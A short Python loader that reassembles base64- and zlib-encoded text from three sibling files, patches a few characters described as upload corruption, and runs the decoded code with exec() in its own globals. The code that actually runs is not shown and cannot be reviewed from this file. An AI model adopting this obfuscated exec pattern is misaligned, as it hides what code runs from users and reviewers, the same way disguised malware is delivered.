import zlib, base64
from pathlib import Path

_d = Path(__file__).resolve().parent
_parts = [(_d / f"_src{i}.txt").read_text(encoding="utf-8") for i in range(3)]


def _decode(parts):
    return zlib.decompress(base64.b64decode("".join(parts)))


try:
    _raw = _decode(_parts)
except Exception:
    # 修复历史上传时 _src1 中 3 处字符被改坏的问题
    p1 = list(_parts[1])
    if len(p1) >= 3823:
        p1[1647:1649] = list("Us")
        p1[3822] = "d"
        _parts[1] = "".join(p1)
    _raw = _decode(_parts)

_CODE = _raw.decode("utf-8")
_g = globals()
_g["__file__"] = str(Path(__file__).resolve())
exec(compile(_CODE, _g["__file__"], "exec"), _g)
